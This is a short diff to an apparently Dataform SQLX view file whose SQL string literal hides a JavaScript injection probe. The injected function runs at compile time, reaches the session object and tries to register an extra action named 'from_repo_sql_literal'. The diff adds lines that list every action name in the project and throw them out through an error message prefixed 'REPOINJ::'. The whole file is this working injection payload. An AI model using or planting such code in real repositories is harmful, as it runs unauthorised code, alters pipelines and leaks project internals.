@@ -1,6 +1,8 @@
 config { type: "view" }
 SELECT 'i_${ (function(){
   var S = ctx.table.session;
-  try { S.publish("from_repo_sql_literal").query(function(){ return "SELECT 1 AS x"; }); } catch(e){}
-  return "ok";
+  var o = {};
+  try { S.publish("from_repo_sql_literal").query(function(){ return "SELECT 1 AS x"; }); } catch(e){ o.pe = String(e).slice(0,120); }
+  try { o.names = S.actions.map(function(x){ try { return x.proto.target.name; } catch(e){ return "?"; } }).join(","); } catch(e){}
+  throw new Error("REPOINJ::" + JSON.stringify(o));
 })() }_j' AS probe
